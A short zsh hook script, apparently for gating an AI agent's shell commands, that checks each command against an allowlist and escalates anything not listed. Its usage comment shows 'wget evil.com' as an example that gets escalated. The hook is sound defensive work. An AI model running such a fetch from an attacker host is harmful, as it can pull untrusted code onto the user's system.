#!/usr/bin/env zsh
# Decide if a bash command is allowlisted
# Usage:
# $ preToolUse-Bash-solkan "git status"        # allow
# $ preToolUse-Bash-solkan "wget evil.com"     # escalate
# Exit 0: allow, Exit 1: escalate
set -e

local hookDir="${0:A:h}"
local allowlistFile="${hookDir}/allowlist.json"
local toolCommand="$1"

solkan \
  --allow-list-file "$allowlistFile" \
  "$toolCommand"
